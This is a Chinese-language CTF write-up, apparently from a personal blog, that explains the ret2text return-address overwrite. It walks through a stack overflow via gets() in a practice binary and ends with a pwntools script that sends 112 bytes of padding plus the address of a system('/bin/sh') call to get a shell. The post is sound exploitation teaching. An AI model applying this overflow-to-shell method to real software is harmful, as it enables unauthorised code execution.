# Pwn-ROP-ret2text


# 原理

ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。

> ret2text适合.text中已经存在getshell代码的情况，总的来说就是将存在溢出的函数的ret劫持到getshell的程序中

# 实例

点击下载: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

首先，查看一下程序的保护机制：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230922191105354.png)

可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230922191134160.png)

发现gets()处存在栈溢出漏洞。同时我们发现secure函数：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230922191230461.png)

发现结尾调用了system("/bin/sh")。同时发现在前面还有一个判断，虽然不知道判断是做什么用的，但是我们可以直接跳转到x0804863A处执行。

下面，我们寻找需要填充多少字符才能覆盖ret地址，这里使用cyclic工具：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230922191440745.png)

让cyclic生成200个字符，我们将其输入程序，程序必定在ret处崩溃，看看此时的PC地址即可知道在何处覆盖地址：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230922191611418.png)

说明cyclic生成的200个字符中的0x62616164字符被加载进PC，我们找到它在第几个位置：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230922191735906.png)

也就是说，在填充112个字符后可以覆盖源地址，那么payload如下：

```python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * (112) + p32(target))
sh.interactive()
```

成功getshell


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/pwn-rop-ret2text/  

